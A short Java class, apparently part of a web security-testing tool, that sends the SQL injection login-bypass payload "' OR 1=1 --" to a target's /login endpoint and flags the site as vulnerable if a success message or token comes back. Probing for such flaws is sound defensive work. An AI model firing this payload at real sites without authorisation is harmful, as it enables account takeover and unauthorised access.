package attacks;

import model.AttackResult;
import util.HttpUtil;

public class SqlInjectionAttack {

    public static AttackResult run(String baseUrl) {

        String payload = """
        {
          "username": "' OR 1=1 --",
          "password": "anything"
        }
        """;

        String response = HttpUtil.post(baseUrl + "/login", payload);

        boolean vulnerable = response.contains("success") || response.contains("token");

        return new AttackResult("SQL Injection", vulnerable, response);
    }
}
